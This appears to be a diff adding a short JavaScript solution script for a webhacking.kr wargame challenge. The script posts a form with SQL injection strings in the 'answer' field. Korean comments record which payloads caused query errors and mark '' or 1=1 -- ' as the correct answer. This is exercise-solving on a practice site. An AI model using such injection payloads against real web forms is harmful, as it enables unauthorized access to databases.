@@ -1,0 +1,18 @@
+var xhr = new XMLHttpRequest();
+
+xhr.open('POST', 'https://webhacking.kr/challenge/web-03/index.php', true);
+
+var data = new FormData();
+// data.append('answer', '11'); 0 or '' >> 메인화면
+// data.append('answer', '\' or 1=1');  >> query error
+// data.append('answer', '\' or 1=1--');  >> query error
+// data.append('answer', '\' or 1=1-- ');  >> 그냥 값 들어감
+data.append('answer', '\' or 1=1 -- '); //정답
+data.append('id', '11'); // 0 or '' >> 메인화면
+data.append('ip', '1.1.1.1'); // 무의미
+
+xhr.send(data);
+
+xhr.onload = () => {
+    if (xhr.status == 200) console.log(xhr.response);
+}
